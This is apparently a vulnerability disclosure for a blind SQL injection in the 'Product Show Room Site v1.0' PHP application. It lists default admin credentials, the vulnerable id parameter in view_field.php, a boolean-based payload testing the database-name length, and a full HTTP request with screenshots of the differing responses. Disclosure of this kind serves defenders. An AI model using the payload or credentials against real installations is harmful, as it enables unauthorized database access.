# Product Show Room Site v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15370/product-show-room-site-phpoop-free-source-code.html

Vulnerability File: /psrs/admin/fields/view_field.php?id=

Vulnerability location: /psrs/admin/fields/view_field.php?id=, id

Current database name: psrs_db ,length is 7

[+] Payload: /psrs/admin/fields/view_field.php?id=1%27%20and%20length(database())%20=7--+ // Leak place ---> id

```sql
GET /psrs/admin/fields/view_field.php?id=1%27%20and%20length(database())%20=7--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=7g6mvmuq5m1o1cvqrhprll4jr1
Connection: close
```

When length (database ()) = 6, Content-Length: 835
![image](https://user-images.githubusercontent.com/54017627/171829933-3373b138-ac43-4293-9839-0991c0f9275e.png)

![image](https://user-images.githubusercontent.com/54017627/171829991-718618fb-36d0-4d42-95ac-d74dff7a5305.png)

When length (database ()) = 7, Content-Length: 628
![image](https://user-images.githubusercontent.com/54017627/171829903-df67293a-67a4-46d0-b552-9f3dc3017814.png)

![image](https://user-images.githubusercontent.com/54017627/171829959-f42c2719-5163-4716-845a-398edd7d7660.png)
